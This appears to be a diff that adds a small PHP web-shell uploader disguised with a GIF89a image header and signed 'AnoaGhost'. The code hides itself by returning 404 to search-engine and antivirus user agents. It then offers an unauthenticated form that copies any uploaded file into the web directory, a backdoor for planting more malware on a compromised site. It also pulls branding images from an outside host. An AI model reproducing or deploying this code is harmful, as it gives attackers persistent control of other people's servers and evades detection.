@@ -1,0 +1,39 @@
+GIF89a;
+<?php
+
+if(!empty($_SERVER['HTTP_USER_AGENT'])) {
+$USERAGENTS = array("Twitter","Bing", "Yahoo", "Facebook", "Google", "AnoaGhost", "Yandex", "Baidu", "Avast");
+if(preg_match('/MK/' . implode('|', $USERAGENTS) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+header('HTTP/1.0 404 NOT FOUND');
+exit; } }
+?>
+<title>Uploader Your File By AnoaGhost</title>
+<link rel="SHORTCUT ICON" href="http://onlymat.com/INSP3CTOR%20TEAM.png" type="image/gif">
+<br>
+<style type="text/css">
+			body {
+				background-image:url('http://onlymat.com/3.png');
+				background-color: #000000;
+				background-repeat:no-repeat;
+				background-size: 100% ;
+				background-position:top center;
+				margin: 0px;
+				font-family: Iceland, sans-serif;
+			}
+		</style>
+<p align="center">
+<img src="http://onlymat.com/INSP3CTOR%20TEAM.png" width="350" height="300">
+<center>
+<center>
+<?php
+echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+echo '<input type="file" name="file" size="500"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
+if( $_POST['_upl'] == "Upload" ) {
+if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Sukses !!!<b><br><br>'; }
+else { echo '<b>Gagal :3</b><br><br>'; }
+}
+?>
+<br>
+<b><font color="lime">
+Coded Designed By AnoaGhost
+</center>
